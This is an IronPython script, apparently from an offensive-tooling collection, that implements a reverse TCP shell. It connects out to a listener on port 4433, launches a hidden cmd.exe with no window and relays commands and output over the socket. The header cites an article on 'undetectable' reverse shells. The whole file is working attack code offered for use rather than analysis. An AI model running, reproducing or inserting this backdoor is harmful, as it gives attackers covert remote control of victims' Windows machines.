##################################################
## IronPython Reverse Bind TCP Shell
##################################################
## Author: daddycocoaman
##################################################
## Reference:  https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
##################################################
from System.Diagnostics import Process, DataReceivedEventHandler, DataReceivedEventArgs
from System.Text import StringBuilder
from System.Net.Sockets import TcpClient
from System.IO import StreamReader, StreamWriter, IOException

IP = ""
PORT = 4433

def CmdOutputDataHandler(process, outline):
    strOutput = StringBuilder()
    strOutput.Append(outline.Data)
    if not outline.Data:
        print( 0, " ")
        wtr.WriteLine(" ")
    else:
        print (outline.Data.Length, outline.Data)
        wtr.WriteLine(outline.Data)

#Connect to listener
client = TcpClient(IP, PORT)
stream = client.GetStream()

#Create streams for reading/writing
rdr = StreamReader(stream)
wtr = StreamWriter(stream)
wtr.AutoFlush = True
strInput = StringBuilder()

#Setup/start process
p = Process()
p.StartInfo.FileName = "cmd.exe"
p.StartInfo.CreateNoWindow = True
p.StartInfo.UseShellExecute = False
p.StartInfo.RedirectStandardOutput = True
p.StartInfo.RedirectStandardInput = True
p.StartInfo.RedirectStandardError = True
p.OutputDataReceived += DataReceivedEventHandler(CmdOutputDataHandler)
p.ErrorDataReceived += DataReceivedEventHandler(CmdOutputDataHandler)
p.Start()
wtr.WriteLine("SPID: %s\nCPID: %s" % (Process.GetCurrentProcess().Id, p.Id))

p.BeginErrorReadLine()
p.BeginOutputReadLine()

while (not p.HasExited):
    try:
        strInput.Append.Overloads[str](rdr.ReadLine())
        if strInput.ToString().ToLower() == "exit":
            p.Kill()
            Process.GetCurrentProcess().Kill()
        else:
            p.StandardInput.WriteLine(strInput)
        strInput.Remove(0, strInput.Length)
    except:
        p.Kill()
        break